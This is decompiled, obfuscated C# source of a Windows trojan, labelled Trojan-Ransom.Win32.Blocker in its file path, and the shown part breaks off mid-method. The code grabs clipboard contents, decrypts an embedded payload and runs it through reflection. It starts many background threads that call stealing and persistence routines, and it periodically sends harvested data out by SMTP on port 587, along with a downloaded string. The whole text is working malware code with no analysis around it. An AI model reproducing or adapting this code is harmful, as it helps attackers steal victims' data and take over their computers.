// Decompiled with JetBrains decompiler
// Type: #f.#xD
// Assembly: SynMood, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E74E0BE3-2156-4FD1-87D6-9C934F391488
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asay-91a905762db9f9c40fe89fad88d7cbf29ff032af.exe

using \u0023f;
using \u0023i;
using \u0023Ye;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace \u0023f
{
  internal class \u0023xD
  {
    public static byte[] \u00235F;
    public static bool \u00236F;
    public static bool \u00237F;
    public static bool \u00238F;
    public static bool \u00239F;
    public static bool \u0023aG;
    public static bool \u00235c;
    public static bool \u0023bG;
    public static bool \u0023cG;
    public static bool \u0023dG;
    public static bool \u0023eG;
    public static bool \u0023fG;
    public static bool \u0023gG;
    public static bool \u0023hG;
    public static bool \u0023iG;
    public static bool \u0023jG;
    public static bool \u0023kG;
    public static bool \u0023lG;
    public static bool \u0023mG;
    public static bool \u0023nG;
    public static bool \u0023oG;
    public static bool \u0023pG;
    public static bool \u0023qG;
    public static bool \u0023rG;
    public static bool \u0023sG;
    public static bool \u0023tG;
    public static bool \u0023uG;
    public static bool \u0023vG;
    public static bool \u0023wG;
    public static bool \u0023xG;
    public static bool \u0023yG;
    public static bool \u0023zG;
    public static bool \u0023AG;
    public static bool \u0023BG;
    public static bool \u0023CG;
    public static bool \u0023DG;
    public static bool \u0023EG;
    public static bool \u0023FG;
    public static bool \u0023GG;
    public static bool \u0023HG;
    public static string \u0023IG;
    public static bool \u0023JG;
    public static int \u0023KG;
    public static bool \u0023LG;
    public static bool \u0023MG;
    public static bool \u0023NG;
    public static System.Timers.Timer \u0023OG;
    public static string \u0023PG;
    public static string \u0023QG;
    public static string \u0023RG;
    public static \u0023zD \u0023SG;

    static \u0023xD()
    {
      // ISSUE: unable to decompile the method.
    }

    [STAThread]
    public static void \u0023b()
    {
      try
      {
        \u0023xD.\u00235F = \u0023xD.\u0023TG();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0023xD.\u0023IG = Clipboard.GetText();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (\u0023xD.\u0023JG)
      {
        try
        {
          do
          {
            if (true)
              goto label_7;
label_6:
            continue;
label_7:
            Thread.Sleep(5000);
            goto label_6;
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        if (true)
          \u0023xD.\u00234G();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num = \u0023xD.\u00235c ? 1 : 0;
      if (true)
      {
        if (num != 0)
        {
          try
          {
            Thread thread1 = new Thread(new ThreadStart(\u0023xD.\u00231c));
            if (true)
              goto label_18;
label_15:
            Thread thread2;
            Thread thread3 = thread2;
            if (true)
              goto label_19;
label_16:
            if (true)
            {
              Thread thread4 = thread2;
              if (true)
              {
                thread4.Start();
                goto label_22;
              }
              else
                goto label_22;
            }
            else
              goto label_22;
label_19:
            thread3.IsBackground = true;
            goto label_16;
label_18:
            thread2 = thread1;
            goto label_15;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
label_22:
        try
        {
          Thread thread5 = new Thread(new ThreadStart(\u0023xD.\u0023WG));
          if (true)
            goto label_24;
label_23:
          Thread thread6;
          thread6.IsBackground = true;
          thread6.Start();
          goto label_26;
label_24:
          thread6 = thread5;
          goto label_23;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_26:
        if (\u0023xD.\u00236F)
        {
          try
          {
            new Thread(new ThreadStart(\u0023xD.\u0023XG))
            {
              IsBackground = true
            }.Start();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          \u0023xD.\u0023SG = new \u0023zD();
          \u0023zD.\u0023bH();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          \u0023xD.\u0023OG.Interval = (double) \u0023xD.\u0023KG;
          \u0023xD.\u0023OG.Elapsed += new ElapsedEventHandler(\u0023xD.\u0023uD);
          \u0023xD.\u0023OG.Enabled = true;
          \u0023xD.\u0023OG.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (\u0023xD.\u00237F)
        {
          try
          {
            new Thread(new ThreadStart(\u0023xD.\u0023YG))
            {
              IsBackground = true
            }.Start();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u00238F)
        {
          try
          {
            new Thread(new ThreadStart(\u0023xD.\u0023ZG))
            {
              IsBackground = true
            }.Start();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        num = \u0023xD.\u00239F ? 1 : 0;
      }
      if (num != 0)
      {
        try
        {
          new Thread(new ThreadStart(\u0023xD.\u0023vD))
          {
            IsBackground = true
          }.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        new Thread(new ThreadStart(\u0023xD.\u0023wD))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread thread;
        if (true)
        {
          thread = new Thread(new ThreadStart(\u0023xD.\u00232G));
          thread.IsBackground = true;
        }
        thread.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        new Thread(new ThreadStart(\u0023xD.\u00231G))
        {
          IsBackground = true
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread thread = new Thread(new ThreadStart(\u0023xD.\u00230G));
        thread.IsBackground = true;
        if (true)
          thread.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().WaitForExit();
    }

    [SpecialName]
    public static byte[] \u0023TG() => Encoding.Default.GetBytes(\u0023xD.\u0023UG(Encoding.Default.GetString(\u0023xD.\u00233G(\u0023h.\u0023g(245))), \u0023h.\u0023g(282), \u0023h.\u0023g(307)));

    private static void \u0023uD([In] object obj0, [In] ElapsedEventArgs obj1)
    {
      string str1;
      string str2;
      int num1;
      if (true)
      {
        string str3 = \u0023h.\u0023g(244);
        if (true)
          goto label_33;
label_2:
        string str4 = \u0023h.\u0023g(244);
        if (true)
          goto label_34;
label_3:
        if (true)
        {
          num1 = 0;
          goto label_4;
        }
        else
          goto label_4;
label_34:
        str2 = str4;
        goto label_3;
label_33:
        str1 = str3;
        goto label_2;
      }
label_4:
      WebClient webClient1 = new WebClient();
      if (true)
        goto label_36;
label_5:
      if (\u0023xD.\u0023MG)
      {
        try
        {
          string[] strArray1 = new string[6];
          if (true)
            goto label_8;
label_7:
          string[] strArray2;
          strArray2[0] = \u0023h.\u0023g(332);
          strArray2[1] = Environment.NewLine;
          strArray2[2] = Environment.NewLine;
          strArray2[3] = \u0023xD.\u0023IG;
          strArray2[4] = Environment.NewLine;
          strArray2[5] = Environment.NewLine;
          string str5 = string.Concat(strArray2);
          if (true)
          {
            str1 = str5;
            goto label_11;
          }
          else
            goto label_11;
label_8:
          strArray2 = strArray1;
          goto label_7;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
label_11:
      WebClient webClient2;
      try
      {
        str2 = \u0023h.\u0023g(365) + webClient2.DownloadString(\u0023h.\u0023g(406)) + \u0023h.\u0023g(435);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.CompareString(\u0023xD.\u0023RG, \u0023h.\u0023g(244), false) != 0)
        {
          try
          {
            string[] strArray = new string[5];
            if (true)
            {
              strArray[0] = \u0023xD.\u0023RG;
              strArray[1] = \u0023h.\u0023g(435);
              strArray[2] = str2;
              strArray[3] = \u0023h.\u0023g(444);
              strArray[4] = str1;
            }
            \u0023xD.\u0023QG = string.Concat(strArray);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            if (true)
              ProjectData.ClearProjectError();
          }
          string str6 = \u0023h.\u0023g(449) + \u0023mb.\u0023jb().Name + \u0023h.\u0023g(502) + DateTime.Now.ToString();
          if (\u0023xD.\u0023NG)
          {
            if (\u0023xD.\u0023aG)
            {
              try
              {
                \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(511), \u0023h.\u0023g(564), new object[5]
                {
                  (object) \u0023h.\u0023g(573),
                  (object) str6,
                  (object) \u0023xD.\u0023QG,
                  (object) true,
                  (object) num1
                });
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else
            {
              try
              {
                \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(586), \u0023h.\u0023g(639), new object[9]
                {
                  (object) \u0023h.\u0023g(648),
                  (object) \u0023h.\u0023g(681),
                  (object) \u0023h.\u0023g(706),
                  (object) 587,
                  (object) str6,
                  (object) \u0023xD.\u0023QG,
                  (object) true,
                  (object) num1,
                  (object) false
                });
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          else if (\u0023xD.\u0023aG)
          {
            try
            {
              \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(511), \u0023h.\u0023g(564), new object[5]
              {
                (object) \u0023h.\u0023g(573),
                (object) str6,
                (object) \u0023xD.\u0023QG,
                (object) false,
                (object) num1
              });
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else
          {
            try
            {
              \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(586), \u0023h.\u0023g(639), new object[9]
              {
                (object) \u0023h.\u0023g(648),
                (object) \u0023h.\u0023g(681),
                (object) \u0023h.\u0023g(706),
                (object) 587,
                (object) str6,
                (object) \u0023xD.\u0023QG,
                (object) false,
                (object) num1,
                (object) false
              });
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0023xD.\u0023QG = \u0023h.\u0023g(244);
        \u0023xD.\u0023RG = \u0023h.\u0023g(244);
        \u0023xD.\u0023PG = \u0023h.\u0023g(244);
        int num2 = num1 + 1;
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return;
      }
label_36:
      webClient2 = webClient1;
      goto label_5;
    }

    public static string \u0023UG([In] string obj0, [In] string obj1, [In] string obj2)
    {
      string str1;
      try
      {
        int num1 = 727;
        byte[] buffer;
        byte[] bytes1;
        RijndaelManaged rijndaelManaged;
        byte[] rgbIV;
        int num2;
        while (true)
        {
          string str2 = \u0023h.\u0023g(num1);
          if (true)
            goto label_30;
label_2:
          byte[] bytes2;
          string str3;
          int num3;
          int num4;
          if (true)
          {
            string str4 = Conversions.ToString(2);
            if (true)
              goto label_31;
label_4:
            int num5 = 736;
            if (num5 != 0)
            {
              if (num5 != 0)
              {
                string str5 = \u0023h.\u0023g(num5);
                if (true)
                  goto label_32;
label_7:
                if (true)
                  goto label_33;
label_8:
                string s;
                if (Operators.CompareString(obj0, \u0023h.\u0023g(244), false) != 0)
                {
                  byte[] bytes3 = Encoding.ASCII.GetBytes(s);
                  if (true)
                    goto label_35;
label_12:
                  bytes2 = Encoding.ASCII.GetBytes(obj2);
                  buffer = Convert.FromBase64String(obj0);
                  goto label_13;
label_35:
                  rgbIV = bytes3;
                  goto label_12;
                }
                else
                  break;
label_33:
                num3 = 256;
                goto label_8;
label_32:
                s = str5;
                goto label_7;
              }
              else
              {
                num2 = num5;
                goto label_15;
              }
            }
            else
            {
              num4 = num5;
              goto label_14;
            }
label_31:
            str3 = str4;
            goto label_4;
          }
label_13:
          string strHashName;
          bytes1 = new PasswordDeriveBytes(obj1, bytes2, strHashName, Conversions.ToInteger(str3)).GetBytes((int) Math.Round((double) num3 / 8.0));
          rijndaelManaged = new RijndaelManaged();
          rijndaelManaged.Mode = CipherMode.CBC;
          num4 = buffer.Length;
label_14:
          num2 = num4 - 1;
label_15:
          if (false)
          {
            num1 = num2;
            continue;
          }
          goto label_16;
label_30:
          strHashName = str2;
          goto label_2;
        }
        string str6 = \u0023h.\u0023g(244);
        if (true)
        {
          str1 = str6;
          goto label_37;
        }
        else
          goto label_37;
label_16:
        byte[] numArray = new byte[num2 + 1];
        int count = 0;
        using (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes1, rgbIV))
        {
          using (MemoryStream memoryStream = new MemoryStream(buffer))
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
            {
              count = cryptoStream.Read(numArray, 0, numArray.Length);
              memoryStream.Close();
              cryptoStream.Close();
            }
          }
        }
        rijndaelManaged.Clear();
        str1 = Encoding.UTF8.GetString(numArray, 0, count);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = \u0023h.\u0023g(244);
        ProjectData.ClearProjectError();
      }
label_37:
      return str1;
    }

    public static object \u0023VG([In] byte[] obj0, [In] string obj1, [In] string obj2, [In] object[] obj3)
    {
label_0:
      object obj;
      try
      {
        object[] objArray1 = new object[4];
        if (true)
          goto label_11;
label_1:
        object[] objArray2;
        do
        {
          objArray2[0] = (object) obj0;
          if (true)
          {
            if (true)
              objArray2[1] = (object) obj1;
            else
              goto label_5;
          }
          else
            goto label_0;
        }
        while (false);
        objArray2[2] = (object) obj2;
label_5:
        objArray2[3] = (object) obj3;
        object[] objArray3 = objArray2;
        if (true)
          goto label_12;
label_6:
        object[] objArray4;
        byte[] numArray = (byte[]) objArray4[0];
        if (true)
          goto label_13;
label_7:
        byte[] rawAssembly;
        Assembly assembly1 = Assembly.Load(rawAssembly);
        if (true)
          goto label_14;
label_8:
        Assembly assembly2;
        System.Type type1 = assembly2.GetType(Conversions.ToString(objArray4[1]));
        if (true)
          goto label_15;
label_9:
        System.Type type2;
        MethodInfo method = type2.GetMethod(Conversions.ToString(objArray4[2]));
        if (true)
          goto label_16;
label_10:
        MethodInfo methodInfo;
        obj = methodInfo.Invoke((object) null, (object[]) objArray4[3]);
        goto label_18;
label_16:
        methodInfo = method;
        goto label_10;
label_15:
        type2 = type1;
        goto label_9;
label_14:
        assembly2 = assembly1;
        goto label_8;
label_13:
        rawAssembly = numArray;
        goto label_7;
label_12:
        objArray4 = objArray3;
        goto label_6;
label_11:
        objArray2 = objArray1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) null;
        ProjectData.ClearProjectError();
      }
label_18:
      return obj;
    }

    public static void \u00231c()
    {
      try
      {
        if (false)
          return;
        \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(761), \u0023h.\u0023g(810), new object[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (false)
          return;
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0023WG()
    {
      try
      {
        if (false)
          return;
        \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(761), \u0023h.\u0023g(819), new object[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (false)
          return;
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0023XG()
    {
      try
      {
        byte[] numArray = \u0023xD.\u00235F;
        string str1 = \u0023h.\u0023g(761);
        string str2 = \u0023h.\u0023g(840);
        object[] objArray1 = new object[2];
        if (true)
          goto label_2;
label_1:
        object[] objArray2;
        objArray2[0] = (object) \u0023h.\u0023g(861);
        objArray2[1] = (object) \u0023h.\u0023g(878);
        object[] objArray3 = objArray2;
        \u0023xD.\u0023VG(numArray, str1, str2, objArray3);
        return;
label_2:
        objArray2 = objArray1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          ProjectData.ClearProjectError();
        }
        while (false);
      }
    }

    public static void \u0023YG()
    {
      try
      {
        byte[] numArray = \u0023xD.\u00235F;
        string str1 = \u0023h.\u0023g(761);
        string str2 = \u0023h.\u0023g(895);
        object[] objArray1 = new object[3];
        if (true)
          goto label_2;
label_1:
        object[] objArray2;
        objArray2[0] = (object) \u0023h.\u0023g(912);
        objArray2[1] = (object) \u0023h.\u0023g(925);
        objArray2[2] = (object) 12345670;
        object[] objArray3 = objArray2;
        \u0023xD.\u0023VG(numArray, str1, str2, objArray3);
        return;
label_2:
        objArray2 = objArray1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (false)
          return;
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0023ZG()
    {
      try
      {
        if (false)
          return;
        byte[] numArray = \u0023xD.\u00235F;
        string str1 = \u0023h.\u0023g(761);
        string str2 = \u0023h.\u0023g(934);
        object[] objArray1 = new object[1];
        if (true)
          goto label_3;
label_2:
        object[] objArray2;
        objArray2[0] = (object) \u0023h.\u0023g(959);
        object[] objArray3 = objArray2;
        \u0023xD.\u0023VG(numArray, str1, str2, objArray3);
        return;
label_3:
        objArray2 = objArray1;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0023vD()
    {
      string str1 = \u0023h.\u0023g(968);
      string name = \u0023mb.\u0023jb().Name;
      string str2 = \u0023h.\u0023g(502);
      DateTime now = DateTime.Now;
      if (true)
        goto label_13;
label_1:
      DateTime dateTime;
      string str3 = dateTime.ToString();
      string str4 = str1 + name + str2 + str3;
      if (true)
        goto label_14;
label_2:
      string str5 = Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(761), \u0023h.\u0023g(1025), new object[0]));
      if (true)
        goto label_15;
label_3:
      string str6;
      string str7 = \u0023h.\u0023g(1058) + str6;
      if (true)
        goto label_16;
label_4:
      string str8;
      string str9;
      if (\u0023xD.\u0023aG)
      {
        try
        {
          byte[] numArray = \u0023xD.\u00235F;
          string str10 = \u0023h.\u0023g(511);
          string str11 = \u0023h.\u0023g(564);
          object[] objArray1 = new object[5];
          if (true)
            goto label_7;
label_6:
          object[] objArray2;
          objArray2[0] = (object) \u0023h.\u0023g(573);
          objArray2[1] = (object) str8;
          objArray2[2] = (object) str9;
          objArray2[3] = (object) true;
          objArray2[4] = (object) 1337;
          object[] objArray3 = objArray2;
          \u0023xD.\u0023VG(numArray, str10, str11, objArray3);
          return;
label_7:
          objArray2 = objArray1;
          goto label_6;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      else
      {
        try
        {
          byte[] numArray = \u0023xD.\u00235F;
          string str12 = \u0023h.\u0023g(586);
          string str13 = \u0023h.\u0023g(639);
          object[] objArray4 = new object[9];
          if (true)
            goto label_11;
label_10:
          object[] objArray5;
          objArray5[0] = (object) \u0023h.\u0023g(648);
          objArray5[1] = (object) \u0023h.\u0023g(681);
          objArray5[2] = (object) \u0023h.\u0023g(706);
          objArray5[3] = (object) 587;
          objArray5[4] = (object) str8;
          objArray5[5] = (object) str9;
          objArray5[6] = (object) true;
          objArray5[7] = (object) 1337;
          objArray5[8] = (object) false;
          object[] objArray6 = objArray5;
          \u0023xD.\u0023VG(numArray, str12, str13, objArray6);
          return;
label_11:
          objArray5 = objArray4;
          goto label_10;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
label_16:
      str9 = str7;
      goto label_4;
label_15:
      str6 = str5;
      goto label_3;
label_14:
      str8 = str4;
      goto label_2;
label_13:
      dateTime = now;
      goto label_1;
    }

    public static void \u00230G()
    {
      if (\u0023xD.\u0023iG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1183), \u0023h.\u0023g(1240), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      do
      {
        if (\u0023xD.\u0023jG)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1183), \u0023h.\u0023g(1257), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            do
            {
              if (true)
                ProjectData.ClearProjectError();
            }
            while (false);
          }
        }
      }
      while (false);
    }

    public static void \u00231G()
    {
      if (\u0023xD.\u0023DG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(761), \u0023h.\u0023g(1278), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      object[] objArray1;
      if (\u0023xD.\u0023EG)
      {
        try
        {
          byte[] numArray = \u0023xD.\u00235F;
          string str1 = \u0023h.\u0023g(1299);
          string str2 = \u0023h.\u0023g(1352);
          object[] objArray2 = new object[1];
          if (true)
            goto label_6;
label_5:
          objArray1[0] = (object) \u0023h.\u0023g(1369);
          object[] objArray3 = objArray1;
          \u0023xD.\u0023VG(numArray, str1, str2, objArray3);
          goto label_8;
label_6:
          objArray1 = objArray2;
          goto label_5;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
label_8:
      if (!\u0023xD.\u0023FG)
        return;
      try
      {
        byte[] numArray = \u0023xD.\u00235F;
        string str3 = \u0023h.\u0023g(761);
        string str4 = \u0023h.\u0023g(1386);
        object[] objArray4 = new object[1];
        if (true)
          goto label_11;
label_10:
        objArray1[0] = (object) \u0023h.\u0023g(1403);
        object[] objArray5 = objArray1;
        \u0023xD.\u0023VG(numArray, str3, str4, objArray5);
        return;
label_11:
        objArray1 = objArray4;
        goto label_10;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0023wD()
    {
      if (\u0023xD.\u0023bG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1477), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (\u0023xD.\u0023cG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1486), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (\u0023xD.\u0023dG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1499), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (\u0023xD.\u0023eG)
      {
        try
        {
          \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1512), new object[0]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      StringBuilder stringBuilder1;
      if (true)
      {
        if (\u0023xD.\u0023fG)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1525), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023gG)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1538), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023hG)
        {
          try
          {
            \u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1416), \u0023h.\u0023g(1551), new object[0]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        StringBuilder stringBuilder2 = new StringBuilder();
        if (true)
          goto label_81;
label_23:
        if (\u0023xD.\u0023iG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1564), \u0023h.\u0023g(1649), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023jG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1662), \u0023h.\u0023g(1649), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023kG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1739), \u0023h.\u0023g(1816), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023lG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1829), \u0023h.\u0023g(1918), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023mG)
        {
          try
          {
            do
            {
              stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(1931), \u0023h.\u0023g(2008), new object[0])));
            }
            while (false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023nG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2021), \u0023h.\u0023g(2122), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023oG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2131), \u0023h.\u0023g(2208), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023pG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2225), \u0023h.\u0023g(2302), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023qG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2319), \u0023h.\u0023g(2396), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023rG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2409), \u0023h.\u0023g(2490), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023sG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2507), \u0023h.\u0023g(2580), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023tG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2589), \u0023h.\u0023g(2666), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023uG)
        {
          try
          {
            stringBuilder1.AppendLine(Conversions.ToString(\u0023xD.\u0023VG(\u0023xD.\u00235F, \u0023h.\u0023g(2679), \u0023h.\u0023g(2752), new object[0])));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (\u0023xD.\u0023vG)
        {
          try
          {
